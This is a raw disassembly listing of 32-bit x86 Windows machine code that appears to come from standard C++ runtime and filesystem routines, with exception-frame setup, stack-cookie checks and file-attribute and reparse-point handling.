  4028a7:	77 31                	ja     0x4028da
  4028a9:	8b c2                	mov    %edx,%eax
  4028ab:	51                   	push   %ecx
  4028ac:	50                   	push   %eax
  4028ad:	e8 0a 42 00 00       	call   0x406abc
  4028b2:	83 c4 08             	add    $0x8,%esp
  4028b5:	33 c0                	xor    %eax,%eax
  4028b7:	66 89 46 14          	mov    %ax,0x14(%esi)
  4028bb:	89 46 24             	mov    %eax,0x24(%esi)
  4028be:	8d 46 04             	lea    0x4(%esi),%eax
  4028c1:	c7 46 28 07 00 00 00 	movl   $0x7,0x28(%esi)
  4028c8:	50                   	push   %eax
  4028c9:	c7 06 64 93 40 00    	movl   $0x409364,(%esi)
  4028cf:	ff 15 20 91 40 00    	call   *0x409120
  4028d5:	83 c4 04             	add    $0x4,%esp
  4028d8:	5e                   	pop    %esi
  4028d9:	c3                   	ret
  4028da:	ff 15 80 91 40 00    	call   *0x409180
  4028e0:	cc                   	int3
  4028e1:	cc                   	int3
  4028e2:	cc                   	int3
  4028e3:	cc                   	int3
  4028e4:	cc                   	int3
  4028e5:	cc                   	int3
  4028e6:	cc                   	int3
  4028e7:	cc                   	int3
  4028e8:	cc                   	int3
  4028e9:	cc                   	int3
  4028ea:	cc                   	int3
  4028eb:	cc                   	int3
  4028ec:	cc                   	int3
  4028ed:	cc                   	int3
  4028ee:	cc                   	int3
  4028ef:	cc                   	int3
  4028f0:	53                   	push   %ebx
  4028f1:	8b dc                	mov    %esp,%ebx
  4028f3:	83 ec 08             	sub    $0x8,%esp
  4028f6:	83 e4 f8             	and    $0xfffffff8,%esp
  4028f9:	83 c4 04             	add    $0x4,%esp
  4028fc:	55                   	push   %ebp
  4028fd:	8b 6b 04             	mov    0x4(%ebx),%ebp
  402900:	89 6c 24 04          	mov    %ebp,0x4(%esp)
  402904:	8b ec                	mov    %esp,%ebp
  402906:	6a ff                	push   $0xffffffff
  402908:	68 bd 7b 40 00       	push   $0x407bbd
  40290d:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  402913:	50                   	push   %eax
  402914:	53                   	push   %ebx
  402915:	81 ec 80 00 00 00    	sub    $0x80,%esp
  40291b:	56                   	push   %esi
  40291c:	57                   	push   %edi
  40291d:	a1 04 c0 40 00       	mov    0x40c004,%eax
  402922:	33 c5                	xor    %ebp,%eax
  402924:	50                   	push   %eax
  402925:	8d 45 f4             	lea    -0xc(%ebp),%eax
  402928:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  40292e:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  402931:	e8 2a f0 ff ff       	call   0x401960
  402936:	68 44 94 40 00       	push   $0x409444
  40293b:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  40293e:	8b 38                	mov    (%eax),%edi
  402940:	8b 70 04             	mov    0x4(%eax),%esi
  402943:	e8 38 1a 00 00       	call   0x404380
  402948:	56                   	push   %esi
  402949:	57                   	push   %edi
  40294a:	8d 45 d0             	lea    -0x30(%ebp),%eax
  40294d:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  402954:	50                   	push   %eax
  402955:	8d 8d 70 ff ff ff    	lea    -0x90(%ebp),%ecx
  40295b:	e8 e0 f7 ff ff       	call   0x402140
  402960:	68 ec a9 40 00       	push   $0x40a9ec
  402965:	8d 85 70 ff ff ff    	lea    -0x90(%ebp),%eax
  40296b:	50                   	push   %eax
  40296c:	e8 1f 4d 00 00       	call   0x407690
  402971:	cc                   	int3
  402972:	cc                   	int3
  402973:	cc                   	int3
  402974:	cc                   	int3
  402975:	cc                   	int3
  402976:	cc                   	int3
  402977:	cc                   	int3
  402978:	cc                   	int3
  402979:	cc                   	int3
  40297a:	cc                   	int3
  40297b:	cc                   	int3
  40297c:	cc                   	int3
  40297d:	cc                   	int3
  40297e:	cc                   	int3
  40297f:	cc                   	int3
  402980:	55                   	push   %ebp
  402981:	8b ec                	mov    %esp,%ebp
  402983:	6a ff                	push   $0xffffffff
  402985:	68 03 7c 40 00       	push   $0x407c03
  40298a:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  402990:	50                   	push   %eax
  402991:	51                   	push   %ecx
  402992:	56                   	push   %esi
  402993:	57                   	push   %edi
  402994:	a1 04 c0 40 00       	mov    0x40c004,%eax
  402999:	33 c5                	xor    %ebp,%eax
  40299b:	50                   	push   %eax
  40299c:	8d 45 f4             	lea    -0xc(%ebp),%eax
  40299f:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  4029a5:	8b f9                	mov    %ecx,%edi
  4029a7:	89 7d f0             	mov    %edi,-0x10(%ebp)
  4029aa:	8b 75 08             	mov    0x8(%ebp),%esi
  4029ad:	8d 47 04             	lea    0x4(%edi),%eax
  4029b0:	0f 57 c0             	xorps  %xmm0,%xmm0
  4029b3:	c7 07 64 93 40 00    	movl   $0x409364,(%edi)
  4029b9:	50                   	push   %eax
  4029ba:	66 0f d6 00          	movq   %xmm0,(%eax)
  4029be:	8d 46 04             	lea    0x4(%esi),%eax
  4029c1:	50                   	push   %eax
  4029c2:	ff 15 24 91 40 00    	call   *0x409124
  4029c8:	c7 07 ac 95 40 00    	movl   $0x4095ac,(%edi)
  4029ce:	83 c4 08             	add    $0x8,%esp
  4029d1:	8b 46 0c             	mov    0xc(%esi),%eax
  4029d4:	8b 4e 10             	mov    0x10(%esi),%ecx
  4029d7:	89 47 0c             	mov    %eax,0xc(%edi)
  4029da:	89 4f 10             	mov    %ecx,0x10(%edi)
  4029dd:	8d 46 14             	lea    0x14(%esi),%eax
  4029e0:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  4029e7:	8d 4f 14             	lea    0x14(%edi),%ecx
  4029ea:	c7 07 1c 95 40 00    	movl   $0x40951c,(%edi)
  4029f0:	50                   	push   %eax
  4029f1:	e8 6a f6 ff ff       	call   0x402060
  4029f6:	8d 46 2c             	lea    0x2c(%esi),%eax
  4029f9:	c6 45 fc 01          	movb   $0x1,-0x4(%ebp)
  4029fd:	8d 4f 2c             	lea    0x2c(%edi),%ecx
  402a00:	50                   	push   %eax
  402a01:	e8 5a f6 ff ff       	call   0x402060
  402a06:	8d 46 44             	lea    0x44(%esi),%eax
  402a09:	c6 45 fc 02          	movb   $0x2,-0x4(%ebp)
  402a0d:	50                   	push   %eax
  402a0e:	8d 4f 44             	lea    0x44(%edi),%ecx
  402a11:	e8 ea 19 00 00       	call   0x404400
  402a16:	8b c7                	mov    %edi,%eax
  402a18:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  402a1b:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  402a22:	59                   	pop    %ecx
  402a23:	5f                   	pop    %edi
  402a24:	5e                   	pop    %esi
  402a25:	8b e5                	mov    %ebp,%esp
  402a27:	5d                   	pop    %ebp
  402a28:	c2 04 00             	ret    $0x4
  402a2b:	cc                   	int3
  402a2c:	cc                   	int3
  402a2d:	cc                   	int3
  402a2e:	cc                   	int3
  402a2f:	cc                   	int3
  402a30:	53                   	push   %ebx
  402a31:	8b dc                	mov    %esp,%ebx
  402a33:	83 ec 08             	sub    $0x8,%esp
  402a36:	83 e4 f8             	and    $0xfffffff8,%esp
  402a39:	83 c4 04             	add    $0x4,%esp
  402a3c:	55                   	push   %ebp
  402a3d:	8b 6b 04             	mov    0x4(%ebx),%ebp
  402a40:	89 6c 24 04          	mov    %ebp,0x4(%esp)
  402a44:	8b ec                	mov    %esp,%ebp
  402a46:	6a ff                	push   $0xffffffff
  402a48:	68 2d 7c 40 00       	push   $0x407c2d
  402a4d:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  402a53:	50                   	push   %eax
  402a54:	53                   	push   %ebx
  402a55:	81 ec 88 00 00 00    	sub    $0x88,%esp
  402a5b:	56                   	push   %esi
  402a5c:	57                   	push   %edi
  402a5d:	a1 04 c0 40 00       	mov    0x40c004,%eax
  402a62:	33 c5                	xor    %ebp,%eax
  402a64:	50                   	push   %eax
  402a65:	8d 45 f4             	lea    -0xc(%ebp),%eax
  402a68:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  402a6e:	8b f9                	mov    %ecx,%edi
  402a70:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  402a73:	e8 e8 ee ff ff       	call   0x401960
  402a78:	57                   	push   %edi
  402a79:	8b 08                	mov    (%eax),%ecx
  402a7b:	8b 70 04             	mov    0x4(%eax),%esi
  402a7e:	89 4d e8             	mov    %ecx,-0x18(%ebp)
  402a81:	8d 4d c8             	lea    -0x38(%ebp),%ecx
  402a84:	e8 f7 18 00 00       	call   0x404380
  402a89:	56                   	push   %esi
  402a8a:	ff 75 e8             	push   -0x18(%ebp)
  402a8d:	8d 45 c8             	lea    -0x38(%ebp),%eax
  402a90:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  402a97:	ff 73 08             	push   0x8(%ebx)
  402a9a:	8d 8d 68 ff ff ff    	lea    -0x98(%ebp),%ecx
  402aa0:	50                   	push   %eax
  402aa1:	e8 6a f7 ff ff       	call   0x402210
  402aa6:	68 ec a9 40 00       	push   $0x40a9ec
  402aab:	8d 85 68 ff ff ff    	lea    -0x98(%ebp),%eax
  402ab1:	50                   	push   %eax
  402ab2:	e8 d9 4b 00 00       	call   0x407690
  402ab7:	cc                   	int3
  402ab8:	cc                   	int3
  402ab9:	cc                   	int3
  402aba:	cc                   	int3
  402abb:	cc                   	int3
  402abc:	cc                   	int3
  402abd:	cc                   	int3
  402abe:	cc                   	int3
  402abf:	cc                   	int3
  402ac0:	53                   	push   %ebx
  402ac1:	8b dc                	mov    %esp,%ebx
  402ac3:	83 ec 08             	sub    $0x8,%esp
  402ac6:	83 e4 f8             	and    $0xfffffff8,%esp
  402ac9:	83 c4 04             	add    $0x4,%esp
  402acc:	55                   	push   %ebp
  402acd:	8b 6b 04             	mov    0x4(%ebx),%ebp
  402ad0:	89 6c 24 04          	mov    %ebp,0x4(%esp)
  402ad4:	8b ec                	mov    %esp,%ebp
  402ad6:	6a ff                	push   $0xffffffff
  402ad8:	68 5d 7c 40 00       	push   $0x407c5d
  402add:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  402ae3:	50                   	push   %eax
  402ae4:	53                   	push   %ebx
  402ae5:	83 ec 78             	sub    $0x78,%esp
  402ae8:	56                   	push   %esi
  402ae9:	57                   	push   %edi
  402aea:	a1 04 c0 40 00       	mov    0x40c004,%eax
  402aef:	33 c5                	xor    %ebp,%eax
  402af1:	50                   	push   %eax
  402af2:	8d 45 f4             	lea    -0xc(%ebp),%eax
  402af5:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  402afb:	8b 3a                	mov    (%edx),%edi
  402afd:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  402b00:	8b 72 04             	mov    0x4(%edx),%esi
  402b03:	68 64 94 40 00       	push   $0x409464
  402b08:	e8 73 18 00 00       	call   0x404380
  402b0d:	56                   	push   %esi
  402b0e:	57                   	push   %edi
  402b0f:	ff 73 08             	push   0x8(%ebx)
  402b12:	8d 45 d8             	lea    -0x28(%ebp),%eax
  402b15:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  402b1c:	50                   	push   %eax
  402b1d:	8d 8d 78 ff ff ff    	lea    -0x88(%ebp),%ecx
  402b23:	e8 e8 f6 ff ff       	call   0x402210
  402b28:	68 ec a9 40 00       	push   $0x40a9ec
  402b2d:	8d 85 78 ff ff ff    	lea    -0x88(%ebp),%eax
  402b33:	50                   	push   %eax
  402b34:	e8 57 4b 00 00       	call   0x407690
  402b39:	cc                   	int3
  402b3a:	cc                   	int3
  402b3b:	cc                   	int3
  402b3c:	cc                   	int3
  402b3d:	cc                   	int3
  402b3e:	cc                   	int3
  402b3f:	cc                   	int3
  402b40:	55                   	push   %ebp
  402b41:	8b ec                	mov    %esp,%ebp
  402b43:	8b 45 08             	mov    0x8(%ebp),%eax
  402b46:	85 c0                	test   %eax,%eax
  402b48:	75 5e                	jne    0x402ba8
  402b4a:	56                   	push   %esi
  402b4b:	8b 75 0c             	mov    0xc(%ebp),%esi
  402b4e:	b8 6d 01 00 00       	mov    $0x16d,%eax
  402b53:	57                   	push   %edi
  402b54:	bf ff 01 00 00       	mov    $0x1ff,%edi
  402b59:	8b 56 10             	mov    0x10(%esi),%edx
  402b5c:	f6 c2 01             	test   $0x1,%dl
  402b5f:	0f 44 c7             	cmove  %edi,%eax
  402b62:	89 41 04             	mov    %eax,0x4(%ecx)
  402b65:	8b c2                	mov    %edx,%eax
  402b67:	c1 e8 0a             	shr    $0xa,%eax
  402b6a:	a8 01                	test   $0x1,%al
  402b6c:	74 29                	je     0x402b97
  402b6e:	8b 46 14             	mov    0x14(%esi),%eax
  402b71:	3d 0c 00 00 a0       	cmp    $0xa000000c,%eax
  402b76:	75 0c                	jne    0x402b84
  402b78:	5f                   	pop    %edi
  402b79:	c7 01 04 00 00 00    	movl   $0x4,(%ecx)
  402b7f:	5e                   	pop    %esi
  402b80:	5d                   	pop    %ebp
  402b81:	c2 08 00             	ret    $0x8
  402b84:	3d 03 00 00 a0       	cmp    $0xa0000003,%eax
  402b89:	75 0c                	jne    0x402b97
  402b8b:	5f                   	pop    %edi
  402b8c:	c7 01 0a 00 00 00    	movl   $0xa,(%ecx)
  402b92:	5e                   	pop    %esi
  402b93:	5d                   	pop    %ebp
  402b94:	c2 08 00             	ret    $0x8
  402b97:	c1 ea 04             	shr    $0x4,%edx
  402b9a:	83 e2 01             	and    $0x1,%edx
  402b9d:	83 c2 02             	add    $0x2,%edx
  402ba0:	5f                   	pop    %edi
  402ba1:	89 11                	mov    %edx,(%ecx)
  402ba3:	5e                   	pop    %esi
  402ba4:	5d                   	pop    %ebp
  402ba5:	c2 08 00             	ret    $0x8
  402ba8:	83 c0 fe             	add    $0xfffffffe,%eax
  402bab:	c7 41 04 ff ff 00 00 	movl   $0xffff,0x4(%ecx)
  402bb2:	83 f8 79             	cmp    $0x79,%eax
  402bb5:	77 19                	ja     0x402bd0
  402bb7:	0f b6 80 e0 2b 40 00 	movzbl 0x402be0(%eax),%eax
  402bbe:	ff 24 85 d8 2b 40 00 	jmp    *0x402bd8(,%eax,4)
  402bc5:	b8 01 00 00 00       	mov    $0x1,%eax
  402bca:	89 01                	mov    %eax,(%ecx)
  402bcc:	5d                   	pop    %ebp
  402bcd:	c2 08 00             	ret    $0x8
  402bd0:	33 c0                	xor    %eax,%eax
  402bd2:	89 01                	mov    %eax,(%ecx)
  402bd4:	5d                   	pop    %ebp
  402bd5:	c2 08 00             	ret    $0x8
  402bd8:	c5 2b                	lds    (%ebx),%ebp
  402bda:	40                   	inc    %eax
  402bdb:	00 d0                	add    %dl,%al
  402bdd:	2b 40 00             	sub    0x0(%eax),%eax
  402be0:	00 00                	add    %al,(%eax)
  402be2:	01 01                	add    %eax,(%ecx)
  402be4:	01 01                	add    %eax,(%ecx)
  402be6:	01 01                	add    %eax,(%ecx)
  402be8:	01 01                	add    %eax,(%ecx)
  402bea:	01 01                	add    %eax,(%ecx)
  402bec:	01 01                	add    %eax,(%ecx)
  402bee:	01 01                	add    %eax,(%ecx)
  402bf0:	01 01                	add    %eax,(%ecx)
  402bf2:	01 01                	add    %eax,(%ecx)
  402bf4:	01 01                	add    %eax,(%ecx)
  402bf6:	01 01                	add    %eax,(%ecx)
  402bf8:	01 01                	add    %eax,(%ecx)
  402bfa:	01 01                	add    %eax,(%ecx)
  402bfc:	01 01                	add    %eax,(%ecx)
  402bfe:	01 01                	add    %eax,(%ecx)
  402c00:	01 01                	add    %eax,(%ecx)
  402c02:	01 01                	add    %eax,(%ecx)
  402c04:	01 01                	add    %eax,(%ecx)
  402c06:	01 01                	add    %eax,(%ecx)
  402c08:	01 01                	add    %eax,(%ecx)
  402c0a:	01 01                	add    %eax,(%ecx)
  402c0c:	01 01                	add    %eax,(%ecx)
  402c0e:	01 01                	add    %eax,(%ecx)
  402c10:	01 01                	add    %eax,(%ecx)
  402c12:	01 00                	add    %eax,(%eax)
  402c14:	01 01                	add    %eax,(%ecx)
  402c16:	01 01                	add    %eax,(%ecx)
  402c18:	01 01                	add    %eax,(%ecx)
  402c1a:	01 01                	add    %eax,(%ecx)
  402c1c:	01 01                	add    %eax,(%ecx)
  402c1e:	01 01                	add    %eax,(%ecx)
  402c20:	01 01                	add    %eax,(%ecx)
  402c22:	01 01                	add    %eax,(%ecx)
  402c24:	01 01                	add    %eax,(%ecx)
  402c26:	01 01                	add    %eax,(%ecx)
  402c28:	01 01                	add    %eax,(%ecx)
  402c2a:	01 01                	add    %eax,(%ecx)
  402c2c:	01 01                	add    %eax,(%ecx)
  402c2e:	01 01                	add    %eax,(%ecx)
  402c30:	01 01                	add    %eax,(%ecx)
  402c32:	01 01                	add    %eax,(%ecx)
  402c34:	01 01                	add    %eax,(%ecx)
  402c36:	01 01                	add    %eax,(%ecx)
  402c38:	01 01                	add    %eax,(%ecx)
  402c3a:	01 01                	add    %eax,(%ecx)
  402c3c:	01 01                	add    %eax,(%ecx)
  402c3e:	01 01                	add    %eax,(%ecx)
  402c40:	01 01                	add    %eax,(%ecx)
  402c42:	01 01                	add    %eax,(%ecx)
  402c44:	01 01                	add    %eax,(%ecx)
  402c46:	01 01                	add    %eax,(%ecx)
  402c48:	01 01                	add    %eax,(%ecx)
  402c4a:	01 01                	add    %eax,(%ecx)
  402c4c:	01 01                	add    %eax,(%ecx)
  402c4e:	01 01                	add    %eax,(%ecx)
  402c50:	01 01                	add    %eax,(%ecx)
  402c52:	01 01                	add    %eax,(%ecx)
  402c54:	01 01                	add    %eax,(%ecx)
  402c56:	01 01                	add    %eax,(%ecx)
  402c58:	01 00                	add    %eax,(%eax)
  402c5a:	cc                   	int3
  402c5b:	cc                   	int3
  402c5c:	cc                   	int3
  402c5d:	cc                   	int3
  402c5e:	cc                   	int3
  402c5f:	cc                   	int3
  402c60:	55                   	push   %ebp
  402c61:	8b ec                	mov    %esp,%ebp
  402c63:	83 e4 f8             	and    $0xfffffff8,%esp
  402c66:	83 ec 38             	sub    $0x38,%esp
  402c69:	a1 04 c0 40 00       	mov    0x40c004,%eax
  402c6e:	33 c4                	xor    %esp,%eax
  402c70:	89 44 24 34          	mov    %eax,0x34(%esp)
  402c74:	56                   	push   %esi
  402c75:	8b f1                	mov    %ecx,%esi
  402c77:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  402c7e:	00 
  402c7f:	57                   	push   %edi
  402c80:	c7 44 24 10 ff ff 00 	movl   $0xffff,0x10(%esp)
  402c87:	00 
  402c88:	8b 4e 1c             	mov    0x1c(%esi),%ecx
  402c8b:	8b c1                	mov    %ecx,%eax
  402c8d:	83 e0 03             	and    $0x3,%eax
  402c90:	3c 03                	cmp    $0x3,%al
  402c92:	75 19                	jne    0x402cad
  402c94:	56                   	push   %esi
  402c95:	6a 00                	push   $0x0
  402c97:	8d 4c 24 14          	lea    0x14(%esp),%ecx
  402c9b:	c7 44 24 1c 00 00 00 	movl   $0x0,0x1c(%esp)
  402ca2:	00 
  402ca3:	e8 98 fe ff ff       	call   0x402b40
  402ca8:	8d 7e 20             	lea    0x20(%esi),%edi
  402cab:	eb 3d                	jmp    0x402cea
  402cad:	d1 e9                	shr    $1,%ecx
  402caf:	f6 c1 01             	test   $0x1,%cl
  402cb2:	74 05                	je     0x402cb9
  402cb4:	8b 46 10             	mov    0x10(%esi),%eax
  402cb7:	eb 03                	jmp    0x402cbc
  402cb9:	83 c8 ff             	or     $0xffffffff,%eax
  402cbc:	83 7e 34 08          	cmpl   $0x8,0x34(%esi)
  402cc0:	8d 7e 20             	lea    0x20(%esi),%edi
  402cc3:	8b cf                	mov    %edi,%ecx
  402cc5:	72 02                	jb     0x402cc9
  402cc7:	8b 0f                	mov    (%edi),%ecx
  402cc9:	50                   	push   %eax
  402cca:	6a 03                	push   $0x3
  402ccc:	8d 44 24 20          	lea    0x20(%esp),%eax
  402cd0:	50                   	push   %eax
  402cd1:	51                   	push   %ecx
  402cd2:	e8 f5 3a 00 00       	call   0x4067cc
  402cd7:	8d 4c 24 18          	lea    0x18(%esp),%ecx
  402cdb:	89 44 24 14          	mov    %eax,0x14(%esp)
  402cdf:	51                   	push   %ecx
  402ce0:	50                   	push   %eax
  402ce1:	8d 4c 24 14          	lea    0x14(%esp),%ecx
  402ce5:	e8 56 fe ff ff       	call   0x402b40
  402cea:	8b 54 24 14          	mov    0x14(%esp),%edx
  402cee:	8b 44 24 0c          	mov    0xc(%esp),%eax
  402cf2:	85 d2                	test   %edx,%edx
  402cf4:	74 0a                	je     0x402d00
  402cf6:	83 f8 01             	cmp    $0x1,%eax
  402cf9:	74 05                	je     0x402d00
  402cfb:	83 f8 09             	cmp    $0x9,%eax
  402cfe:	75 17                	jne    0x402d17
  402d00:	8b 4c 24 3c          	mov    0x3c(%esp),%ecx
  402d04:	83 f8 03             	cmp    $0x3,%eax
  402d07:	5f                   	pop    %edi
  402d08:	0f 94 c0             	sete   %al
  402d0b:	5e                   	pop    %esi
  402d0c:	33 cc                	xor    %esp,%ecx
  402d0e:	e8 66 3d 00 00       	call   0x406a79
  402d13:	8b e5                	mov    %ebp,%esp
  402d15:	5d                   	pop    %ebp
  402d16:	c3                   	ret
  402d17:	57                   	push   %edi
  402d18:	b9 00 94 40 00       	mov    $0x409400,%ecx
  402d1d:	e8 0e fd ff ff       	call   0x402a30
  402d22:	cc                   	int3
  402d23:	cc                   	int3
  402d24:	cc                   	int3
  402d25:	cc                   	int3
  402d26:	cc                   	int3
  402d27:	cc                   	int3
  402d28:	cc                   	int3
  402d29:	cc                   	int3
  402d2a:	cc                   	int3
  402d2b:	cc                   	int3
  402d2c:	cc                   	int3
  402d2d:	cc                   	int3
  402d2e:	cc                   	int3
  402d2f:	cc                   	int3
  402d30:	55                   	push   %ebp
  402d31:	8b ec                	mov    %esp,%ebp
  402d33:	6a ff                	push   $0xffffffff
  402d35:	68 8d 7c 40 00       	push   $0x407c8d
  402d3a:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  402d40:	50                   	push   %eax
  402d41:	83 ec 2c             	sub    $0x2c,%esp
  402d44:	53                   	push   %ebx
  402d45:	56                   	push   %esi
  402d46:	57                   	push   %edi
  402d47:	a1 04 c0 40 00       	mov    0x40c004,%eax
  402d4c:	33 c5                	xor    %ebp,%eax
  402d4e:	50                   	push   %eax
  402d4f:	8d 45 f4             	lea    -0xc(%ebp),%eax
  402d52:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  402d58:	89 55 e8             	mov    %edx,-0x18(%ebp)
  402d5b:	8b d9                	mov    %ecx,%ebx
  402d5d:	83 7b 14 08          	cmpl   $0x8,0x14(%ebx)
  402d61:	8b f3                	mov    %ebx,%esi
  402d63:	8b 45 08             	mov    0x8(%ebp),%eax
  402d66:	8b 7d 0c             	mov    0xc(%ebp),%edi
  402d69:	89 45 ec             	mov    %eax,-0x14(%ebp)
  402d6c:	72 02                	jb     0x402d70
  402d6e:	8b 33                	mov    (%ebx),%esi
  402d70:	8d 4e 02             	lea    0x2(%esi),%ecx
  402d73:	66 8b 06             	mov    (%esi),%ax
  402d76:	83 c6 02             	add    $0x2,%esi
  402d79:	66 85 c0             	test   %ax,%ax
  402d7c:	75 f5                	jne    0x402d73
  402d7e:	2b f1                	sub    %ecx,%esi
  402d80:	d1 fe                	sar    $1,%esi
  402d82:	0f 84 ee 00 00 00    	je     0x402e76
  402d88:	3b 73 10             	cmp    0x10(%ebx),%esi
  402d8b:	0f 85 e5 00 00 00    	jne    0x402e76
  402d91:	88 45 f0             	mov    %al,-0x10(%ebp)
  402d94:	8d 55 e0             	lea    -0x20(%ebp),%edx
  402d97:	ff 75 f0             	push   -0x10(%ebp)
  402d9a:	8d 4d c8             	lea    -0x38(%ebp),%ecx
  402d9d:	c7 45 e0 18 94 40 00 	movl   $0x409418,-0x20(%ebp)
  402da4:	c7 45 e4 01 00 00 00 	movl   $0x1,-0x1c(%ebp)
  402dab:	e8 c0 31 00 00       	call   0x405f70
  402db0:	83 c4 04             	add    $0x4,%esp
  402db3:	8d 45 c8             	lea    -0x38(%ebp),%eax
  402db6:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  402dbd:	50                   	push   %eax
  402dbe:	8b cb                	mov    %ebx,%ecx
  402dc0:	e8 cb ed ff ff       	call   0x401b90
  402dc5:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  402dc8:	83 f9 08             	cmp    $0x8,%ecx
  402dcb:	72 34                	jb     0x402e01
  402dcd:	8b 55 c8             	mov    -0x38(%ebp),%edx
  402dd0:	8d 0c 4d 02 00 00 00 	lea    0x2(,%ecx,2),%ecx
  402dd7:	8b c2                	mov    %edx,%eax
  402dd9:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  402ddf:	72 16                	jb     0x402df7
  402de1:	8b 50 fc             	mov    -0x4(%eax),%edx
  402de4:	83 c1 23             	add    $0x23,%ecx
  402de7:	2b c2                	sub    %edx,%eax
  402de9:	83 c0 fc             	add    $0xfffffffc,%eax
  402dec:	83 f8 1f             	cmp    $0x1f,%eax
  402def:	76 06                	jbe    0x402df7
  402df1:	ff 15 80 91 40 00    	call   *0x409180
  402df7:	51                   	push   %ecx
  402df8:	52                   	push   %edx
  402df9:	e8 be 3c 00 00       	call   0x406abc
  402dfe:	83 c4 08             	add    $0x8,%esp
  402e01:	83 7b 14 08          	cmpl   $0x8,0x14(%ebx)
  402e05:	72 02                	jb     0x402e09
  402e07:	8b 1b                	mov    (%ebx),%ebx
  402e09:	8b 75 ec             	mov    -0x14(%ebp),%esi
  402e0c:	57                   	push   %edi
  402e0d:	56                   	push   %esi
  402e0e:	53                   	push   %ebx
  402e0f:	e8 58 39 00 00       	call   0x40676c
  402e14:	85 c0                	test   %eax,%eax
  402e16:	75 37                	jne    0x402e4f
  402e18:	8b 36                	mov    (%esi),%esi
  402e1a:	8b cf                	mov    %edi,%ecx
  402e1c:	e8 2f ed ff ff       	call   0x401b50
  402e21:	84 c0                	test   %al,%al
  402e23:	74 16                	je     0x402e3b
  402e25:	57                   	push   %edi
  402e26:	56                   	push   %esi
  402e27:	e8 ff 38 00 00       	call   0x40672b
  402e2c:	85 c0                	test   %eax,%eax
  402e2e:	75 4b                	jne    0x402e7b
  402e30:	8b cf                	mov    %edi,%ecx
  402e32:	e8 19 ed ff ff       	call   0x401b50
  402e37:	84 c0                	test   %al,%al
  402e39:	75 ea                	jne    0x402e25
  402e3b:	33 c0                	xor    %eax,%eax
  402e3d:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  402e40:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  402e47:	59                   	pop    %ecx
  402e48:	5f                   	pop    %edi
  402e49:	5e                   	pop    %esi
  402e4a:	5b                   	pop    %ebx
  402e4b:	8b e5                	mov    %ebp,%esp
  402e4d:	5d                   	pop    %ebp
  402e4e:	c3                   	ret
  402e4f:	83 f8 05             	cmp    $0x5,%eax
  402e52:	75 27                	jne    0x402e7b
  402e54:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  402e57:	d1 e9                	shr    $1,%ecx
  402e59:	f6 c1 01             	test   $0x1,%cl
  402e5c:	b9 12 00 00 00       	mov    $0x12,%ecx
  402e61:	0f 45 c1             	cmovne %ecx,%eax
  402e64:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  402e67:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  402e6e:	59                   	pop    %ecx
  402e6f:	5f                   	pop    %edi
  402e70:	5e                   	pop    %esi
  402e71:	5b                   	pop    %ebx
  402e72:	8b e5                	mov    %ebp,%esp
  402e74:	5d                   	pop    %ebp
  402e75:	c3                   	ret
  402e76:	b8 02 00 00 00       	mov    $0x2,%eax
  402e7b:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  402e7e:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  402e85:	59                   	pop    %ecx
  402e86:	5f                   	pop    %edi
  402e87:	5e                   	pop    %esi
  402e88:	5b                   	pop    %ebx
  402e89:	8b e5                	mov    %ebp,%esp
  402e8b:	5d                   	pop    %ebp
  402e8c:	c3                   	ret
  402e8d:	cc                   	int3
  402e8e:	cc                   	int3
  402e8f:	cc                   	int3
  402e90:	55                   	push   %ebp
  402e91:	8b ec                	mov    %esp,%ebp
  402e93:	6a ff                	push   $0xffffffff
  402e95:	68 bd 7c 40 00       	push   $0x407cbd
  402e9a:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  402ea0:	50                   	push   %eax
  402ea1:	83 ec 28             	sub    $0x28,%esp
  402ea4:	53                   	push   %ebx
  402ea5:	56                   	push   %esi
  402ea6:	57                   	push   %edi
  402ea7:	a1 04 c0 40 00       	mov    0x40c004,%eax
  402eac:	33 c5                	xor    %ebp,%eax
  402eae:	50                   	push   %eax
  402eaf:	8d 45 f4             	lea    -0xc(%ebp),%eax
  402eb2:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  402eb8:	8b d1                	mov    %ecx,%edx
  402eba:	8b 75 08             	mov    0x8(%ebp),%esi
  402ebd:	8b 06                	mov    (%esi),%eax
  402ebf:	89 42 10             	mov    %eax,0x10(%edx)
  402ec2:	8b 46 24             	mov    0x24(%esi),%eax
  402ec5:	89 42 14             	mov    %eax,0x14(%edx)
  402ec8:	c7 42 1c 06 00 00 00 	movl   $0x6,0x1c(%edx)
  402ecf:	f7 06 00 04 00 00    	testl  $0x400,(%esi)
  402ed5:	75 23                	jne    0x402efa
  402ed7:	8b 4e 1c             	mov    0x1c(%esi),%ecx
  402eda:	33 c0                	xor    %eax,%eax
  402edc:	03 46 20             	add    0x20(%esi),%eax
  402edf:	89 42 08             	mov    %eax,0x8(%edx)
